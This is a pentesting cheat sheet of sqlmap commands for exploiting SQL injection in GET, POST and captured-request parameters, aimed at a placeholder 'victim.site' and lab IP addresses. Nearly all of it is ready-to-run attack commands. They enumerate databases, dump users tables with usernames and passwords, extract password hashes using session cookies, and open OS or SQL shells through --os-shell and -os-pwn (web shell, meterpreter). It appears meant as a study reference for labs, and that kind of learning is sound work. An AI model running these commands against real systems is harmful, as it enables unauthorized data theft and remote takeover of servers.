---
title: sqlmap - A tool for testing SQL injection
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting 
---

# sqlmap - A tool for testing SQL injection

## GET parameter

```bash
sqlmap -u ‘http://victim.site/view.php?id=112’ -p id --technique=U
# -p: to indicate an injectable parameter 
# --technique=U  //to indicate a UNION based SQL injection technique
# -b: banner of the database
# --tor: to use a proxy to connect to the target URL
# -v3: to see the payloads that sqlmap is using
# --flush-session: to refresh sessions
# --tamper: default tampers are in /usr/share/sqlmap/tamper
```

## POST parameter

```bash
sqlmap -u <URL> --data=<POST string> -p parameter [options]
```


## Using -r file

Capture the request with burpsuite and save it to a file.

```bash
# Get all databases
sqlmap -r nameoffiletoinject --dbs    

# Get all tables 
sqlmap -r nameoffiletoinject --tables

# Get all columns of a given database dwva
sqlmap -r nameoffiletoinject --current-db dwva -columns

# Get all tables of a given database, for example dwva
sqlmap -r nameoffiletoinject -D dwva --tables

# Get all columns of a given table in a given database
sqlmap -r nameoffiletoinject -D dwva -T users --columns

# Dump users table
sqlmap -r nameoffiletoinject -D dwva -T users --dump

# Get columns username and password of table users from table dwva
sqlmap -r nameoffiletoinject -D dwva -T users -C username,password --dump

# Automatically attempt to upload a web shell using the vulnerable parameter and execute it
sqlmap -r nameoffiletoinject -p vuln-param -os-shell 

# Alternatively use the os-pwn option to gain a shell using meterpreter or vnc 
sqlmap -r nameoffiletoinject -p vuln-param -os-pwn 
```

## Using URL

You can also provide the url with --url or -u

```bash
sqlmap --url ‘http://victim.site’  --dbs --batch //
sqlmap --url ‘http://victim.site’  --users // gets users
sqlmap --url ‘http://victim.site’  --tables // gets all tables
sqlmap --url ‘http://victim.site’  --batch //


# Check what users we have and which privileges that user has.
sqlmap -u $IP/path.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users

# Dump the password hash for an user (postgres in the example) and exploit that super permission.
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" -U postgres --password --batch

# Get a shell 
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" --batch --os-shell                  

```

## Getting a direct SQL Shell

```bash
# Get a OS shell
sqlmap --url ‘http://victim.site’  --os-shell

# GEt a SQL shell
sqlmap --url ‘http://victim.site’  --sql-shell
```
